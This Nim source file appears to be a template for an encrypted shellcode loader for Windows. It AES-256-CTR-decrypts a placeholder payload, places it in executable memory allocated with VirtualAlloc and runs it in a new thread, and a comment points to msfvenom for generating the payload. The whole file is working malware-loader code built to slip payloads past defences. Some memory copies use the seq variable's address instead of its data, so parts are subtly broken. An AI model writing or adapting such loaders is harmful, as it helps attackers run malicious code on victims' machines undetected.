import winim
import nimcrypto


when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"

    elif defined(amd64):
        func toByteSeq*(str: string): seq[byte] {.inline.} =
            ## Converts a string to the corresponding byte sequence.
            @(str.toOpenArrayByte(0, str.high))
        let encShellcode = "REPLACE_ME"
        let iv = "BLANK_IV"
        let passwd = r"BLANK_PASSWORD"
        #let key = r"BLANK_PASSWORD"
        echo "[*] Running in x64 process\n"

        var dctx: CTR[aes256]
        var ivArray: array[aes256.sizeBlock, byte]
        var keyArray: array[aes256.sizeBlock, byte]

        let shellcode = fromHex(encShellcode)
        var decShellcode = newSeq[byte](len(shellcode))
        let decodedIV = fromHex(iv)
        #let decodedkey = fromHex(key)

        echo "Shellcode: ", shellcode

        copyMem(addr ivArray[0], unsafeAddr decodedIV, len(decodedIV))
        echo "Copied iv into memory (maybe)\n"

        var expandedkey = sha256.digest(passwd)
        copyMem(addr keyArray[0], addr expandedkey.data[0], len(expandedkey.data))
        echo "Copied key into memory (maybe)\n"
        dctx.init(keyArray, ivArray)
        dctx.decrypt(shellcode, decShellcode)
        dctx.clear()

        let scLen = cast[SIZE_T](shellcode.len)
        let buffer = VirtualAlloc(cast[LPVOID](0), scLen, cast[DWORD](0x00001000), cast[DWORD](0x40))
        try:
            copyMem(buffer, unsafeAddr decShellcode, scLen)
        except:
            echo "[*] CopyMem failed!"
        try:
            let tHandle = CreateThread(cast[LPSECURITY_ATTRIBUTES](NULL), cast[SIZE_T](0), cast[LPTHREAD_START_ROUTINE](buffer), cast[LPVOID](NULL), cast[DWORD](0), cast[LPDWORD](NULL))
            WaitForSingleObject(tHandle, cast[DWORD](0xFFFFFFFF))
        except:
            echo "[*] CreateThread failed!"
        discard readLine(stdin)
